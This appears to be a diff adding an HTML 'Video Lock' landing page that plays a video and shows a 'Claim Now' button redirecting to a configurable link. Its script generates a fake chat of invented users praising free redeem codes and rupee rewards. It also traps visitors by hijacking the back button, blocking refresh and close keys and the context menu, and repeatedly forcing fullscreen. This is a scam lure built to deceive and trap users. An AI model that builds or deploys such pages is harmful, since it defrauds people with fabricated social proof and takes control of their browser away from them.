@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Video Lock</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800;900&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        body {
+            background: #0a0a1a;
+            color: #fff;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            position: fixed;
+            top: 0;
+            left: 0;
+            display: flex;
+            flex-direction: column;
+            padding: 12px;
+        }
+
+        .bg-glow {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80vw;
+            height: 80vw;
+            background: radial-gradient(circle, rgba(102, 126, 234, 0.12) 0%, transparent 70%);
+            z-index: 0;
+            animation: pulseGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes pulseGlow {
+            0%,
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.6;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.1);
+                opacity: 1;
+            }
+        }
+
+        .top-section {
+            position: relative;
+            z-index: 1;
+            flex: 0 0 auto;
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 0 8px 0;
+        }
+
+        .video-wrapper {
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 20px;
+            border: 2px solid rgba(102, 126, 234, 0.2);
+            box-shadow: 0 0 50px rgba(102, 126, 234, 0.08);
+            padding: 10px;
+            backdrop-filter: blur(10px);
+            animation: fadeInUp 0.8s ease;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px) scale(0.97);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%;
+            background: #000;
+            border-radius: 14px;
+            overflow: hidden;
+            border: 2px solid rgba(102, 126, 234, 0.12);
+        }
+
+        .video-container iframe,
+        .video-container video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            background: #000;
+        }
+
+        .video-container::before {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            border-radius: 16px;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.25), rgba(118, 75, 162, 0.25), rgba(102, 126, 234, 0.25));
+            z-index: -1;
+            animation: borderGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes borderGlow {
+            0%,
+            100% {
+                opacity: 0.4;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+
+        .headline {
+            text-align: center;
+            margin: 12px 0 6px;
+            font-size: 18px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeIn 1s ease;
+            letter-spacing: 0.5px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(8px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .claim-btn-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-top: 8px;
+            animation: fadeIn 1.2s ease;
+        }
+
+        .claim-btn {
+            padding: 12px 45px;
+            border: none;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            transition: all 0.3s ease;
+            position: relative;
+            letter-spacing: 1px;
+            box-shadow: 0 0 30px rgba(102, 126, 234, 0.3);
+            border: 2px solid rgba(255, 255, 255, 0.08);
+        }
+
+        .claim-btn:hover {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 0 50px rgba(102, 126, 234, 0.5);
+        }
+
+        .claim-btn:active {
+            transform: scale(0.97);
+        }
+
+        .claim-btn::before {
+            content: '';
+            position: absolute;
+            top: -4px;
+            left: -4px;
+            right: -4px;
+            bottom: -4px;
+            border-radius: 54px;
+            background: linear-gradient(135deg, rgba(102, 126, 234, 0.5), rgba(118, 75, 162, 0.5), rgba(102, 126, 234, 0.5));
+            z-index: -1;
+            animation: btnGlow 2s ease-in-out infinite;
+            filter: blur(12px);
+        }
+
+        @keyframes btnGlow {
+            0%,
+            100% {
+                opacity: 0.4;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.04);
+            }
+        }
+
+        .claim-btn .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: scale(0);
+            animation: rippleAnim 0.6s linear;
+            pointer-events: none;
+        }
+
+        @keyframes rippleAnim {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        .chat-section {
+            position: relative;
+            z-index: 1;
+            flex: 1;
+            width: 100%;
+            max-width: 800px;
+            margin: 0 auto;
+            min-height: 0;
+            overflow: hidden;
+            border-radius: 16px;
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(5px);
+            animation: fadeInUp 1s ease;
+            margin-top: 4px;
+        }
+
+        .chat-container {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            overflow: hidden;
+            padding: 6px 12px;
+        }
+
+        .chat-messages {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+            padding-bottom: 8px;
+        }
+
+        .chat-message {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 4px 10px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+            border-left: 2px solid rgba(102, 126, 234, 0.12);
+            animation: slideIn 0.3s ease forwards;
+            opacity: 0;
+            transform: translateX(-8px);
+            font-size: 12px;
+        }
+
+        .chat-message .avatar {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            flex-shrink: 0;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: #fff;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .chat-message .username {
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 11px;
+            white-space: nowrap;
+        }
+
+        .chat-message .text {
+            color: rgba(255, 255, 255, 0.65);
+            font-size: 11px;
+            font-weight: 300;
+            word-break: break-word;
+        }
+
+        .chat-message .time {
+            color: rgba(255, 255, 255, 0.2);
+            font-size: 8px;
+            margin-left: auto;
+            white-space: nowrap;
+            font-weight: 300;
+        }
+
+        @keyframes slideIn {
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        ::-webkit-scrollbar {
+            display: none;
+        }
+
+        @media (max-width: 600px) {
+            body {
+                padding: 8px;
+            }
+            .video-wrapper {
+                padding: 6px;
+                border-radius: 14px;
+            }
+            .video-container {
+                border-radius: 10px;
+            }
+            .video-container::before {
+                border-radius: 12px;
+            }
+            .headline {
+                font-size: 14px;
+                margin: 8px 0 4px;
+            }
+            .claim-btn {
+                padding: 10px 30px;
+                font-size: 15px;
+            }
+            .claim-btn::before {
+                border-radius: 40px;
+            }
+            .chat-section {
+                border-radius: 10px;
+                margin-top: 2px;
+            }
+            .chat-message {
+                padding: 3px 8px;
+                font-size: 10px;
+                gap: 4px;
+            }
+            .chat-message .avatar {
+                width: 20px;
+                height: 20px;
+                font-size: 10px;
+            }
+            .chat-message .username {
+                font-size: 9px;
+            }
+            .chat-message .text {
+                font-size: 9px;
+            }
+            .chat-message .time {
+                font-size: 7px;
+            }
+            .chat-container {
+                padding: 4px 8px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .headline {
+                font-size: 12px;
+            }
+            .claim-btn {
+                padding: 8px 20px;
+                font-size: 13px;
+            }
+            .chat-message {
+                font-size: 9px;
+                padding: 2px 6px;
+            }
+            .chat-message .avatar {
+                width: 16px;
+                height: 16px;
+                font-size: 8px;
+            }
+            .chat-message .username {
+                font-size: 8px;
+            }
+            .chat-message .text {
+                font-size: 8px;
+            }
+            .chat-message .time {
+                font-size: 6px;
+            }
+        }
+
+        :-webkit-full-screen .video-container {
+            border-radius: 0;
+        }
+        :-webkit-full-screen .video-wrapper {
+            border-radius: 0;
+            padding: 0;
+            border: none;
+            box-shadow: none;
+            background: transparent;
+        }
+        :-webkit-full-screen .video-container::before {
+            display: none;
+        }
+        :-webkit-full-screen .top-section {
+            max-width: 100%;
+        }
+        :-webkit-full-screen .chat-section {
+            max-width: 100%;
+            border-radius: 0;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-glow"></div>
+
+    <div class="top-section">
+        <div class="video-wrapper">
+            <div class="video-container">
+                <iframe id="videoFrame" src="" allow="autoplay; encrypted-media; fullscreen" allowfullscreen></iframe>
+            </div>
+            <div class="headline" id="headline">🎬 Watch Video</div>
+            <div class="claim-btn-wrapper">
+                <button class="claim-btn" id="claimBtn">🎁 Claim Now</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="chat-section">
+        <div class="chat-container" id="chatContainer">
+            <div class="chat-messages" id="chatMessages"></div>
+        </div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const videoUrl = urlParams.get('video') || localStorage.getItem('videoUrl') || 'https://youtu.be/dQw4w9WgXcQ';
+        const claimUrl = urlParams.get('claim') || localStorage.getItem('claimUrl') || '#';
+        const buttonText = urlParams.get('btn') || localStorage.getItem('buttonText') || 'Claim Now';
+        const headline = urlParams.get('headline') || localStorage.getItem('headline') || '🎬 Watch Video';
+
+        document.getElementById('headline').textContent = headline;
+        document.getElementById('claimBtn').textContent = buttonText || '🎁 Claim Now';
+
+        function loadVideo() {
+            const frame = document.getElementById('videoFrame');
+            const youtubeMatch = videoUrl.match(/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/);
+
+            if (youtubeMatch) {
+                frame.src =
+                    `https://www.youtube.com/embed/${youtubeMatch[1]}?autoplay=1&controls=0&modestbranding=1&rel=0&showinfo=0&iv_load_policy=3&fs=1&loop=1&playlist=${youtubeMatch[1]}`;
+            } else if (videoUrl.match(/\.(mp4|webm|ogg)$/i)) {
+                const video = document.createElement('video');
+                video.src = videoUrl;
+                video.autoplay = true;
+                video.loop = true;
+                video.controls = false;
+                video.playsInline = true;
+                video.style.cssText = 'width:100%;height:100%;object-fit:cover;';
+                const container = document.querySelector('.video-container');
+                container.innerHTML = '';
+                container.appendChild(video);
+                video.play().catch(() => {});
+            } else {
+                frame.src = videoUrl;
+            }
+        }
+
+        // ==================== FAKE CHAT ====================
+        const users = [
+            { name: 'GamerPro', emoji: '🎮' },
+            { name: 'KingSlayer', emoji: '👑' },
+            { name: 'NightWolf', emoji: '🐺' },
+            { name: 'ShadowX', emoji: '🌙' },
+            { name: 'BlazeIt', emoji: '🔥' },
+            { name: 'SniperPro', emoji: '🎯' },
+            { name: 'DemonKing', emoji: '😈' },
+            { name: 'Phoenix', emoji: '🐦' },
+            { name: 'DarkKnight', emoji: '🦇' },
+            { name: 'StarGamer', emoji: '⭐' },
+            { name: 'ThunderX', emoji: '⚡' },
+            { name: 'IceQueen', emoji: '❄️' },
+            { name: 'FireLord', emoji: '🔥' },
+            { name: 'CryptoKing', emoji: '💰' },
+            { name: 'GhostRider', emoji: '👻' },
+            { name: 'Venom', emoji: '🕷️' },
+            { name: 'WizardX', emoji: '🧙' },
+            { name: 'NinjaPro', emoji: '🥷' },
+            { name: 'DragonSlayer', emoji: '🐉' },
+            { name: 'MysticMoon', emoji: '🌙' }
+        ];
+
+        const messages = [
+            'Thanks bhai! 🎉', 'Redeem code mil gaya! 💰', '1000₹ ka redeem code! 🎁',
+            'Best website ever! ⭐', 'Bro thanks a lot! 🙏', 'Redeem code working! ✅',
+            'Amazing! 🔥', 'Got 500₹! 💵', 'Love this! ❤️', 'Best app! 🏆',
+            'Thank you! 🙌', 'Working perfectly! 💯', 'Awesome! 😍', 'Great! 👍',
+            'Superb! 🌟', 'Thanks team! 🤝', 'Nice! 👌', 'Love it! 💖',
+            'Working! ✅', 'Super! 🚀'
+        ];
+
+        const chatContainer = document.getElementById('chatMessages');
+
+        function getRandom(arr) {
+            return arr[Math.floor(Math.random() * arr.length)];
+        }
+
+        function getRandomTime() {
+            const m = String(Math.floor(Math.random() * 60)).padStart(2, '0');
+            const s = String(Math.floor(Math.random() * 60)).padStart(2, '0');
+            return m + ':' + s;
+        }
+
+        function addChat() {
+            const user = getRandom(users);
+            const msg = getRandom(messages);
+            const time = getRandomTime();
+
+            const el = document.createElement('div');
+            el.className = 'chat-message';
+            el.innerHTML = `
+                <span class="avatar">${user.emoji}</span>
+                <span class="username">${user.name}</span>
+                <span class="text">${msg}</span>
+                <span class="time">${time}</span>
+            `;
+            chatContainer.appendChild(el);
+
+            while (chatContainer.children.length > 30) {
+                chatContainer.removeChild(chatContainer.firstChild);
+            }
+        }
+
+        for (let i = 0; i < 8; i++) {
+            setTimeout(addChat, i * 150);
+        }
+
+        setInterval(() => {
+            addChat();
+            if (Math.random() > 0.6) {
+                setTimeout(addChat, 300);
+            }
+        }, 800 + Math.random() * 1200);
+
+        // ==================== CLAIM BUTTON ====================
+        document.getElementById('claimBtn').addEventListener('click', function(e) {
+            const ripple = document.createElement('span');
+            ripple.className = 'ripple';
+            const rect = this.getBoundingClientRect();
+            ripple.style.left = (e.clientX - rect.left) + 'px';
+            ripple.style.top = (e.clientY - rect.top) + 'px';
+            this.appendChild(ripple);
+            setTimeout(() => ripple.remove(), 600);
+
+            if (claimUrl && claimUrl !== '#') {
+                window.location.href = claimUrl;
+            } else {
+                alert('🎉 You have been unlocked!');
+                document.body.style.overflow = 'auto';
+            }
+        });
+
+        // ==================== PREVENT EXIT ====================
+        window.addEventListener('popstate', () => history.pushState(null, null, window.location.href));
+        history.pushState(null, null, window.location.href);
+
+        document.addEventListener('keydown', (e) => {
+            if (['F5', 'Escape'].includes(e.key) || (e.ctrlKey && ['r', 'w'].includes(e.key)) || (e.altKey && e.key === 'F4')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        // ==================== KEEP AWAKE ====================
+        async function keepAwake() {
+            try {
+                await navigator.wakeLock.request('screen');
+            } catch (e) {}
+        }
+        keepAwake();
+
+        // ==================== FULLSCREEN ====================
+        function requestFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) elem.requestFullscreen().catch(() => {});
+            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+        }
+        setTimeout(requestFullscreen, 500);
+
+        document.addEventListener('fullscreenchange', () => {
+            if (!document.fullscreenElement) setTimeout(requestFullscreen, 500);
+        });
+
+        // ==================== INIT ====================
+        loadVideo();
+    </script>
+</body>
+</html>
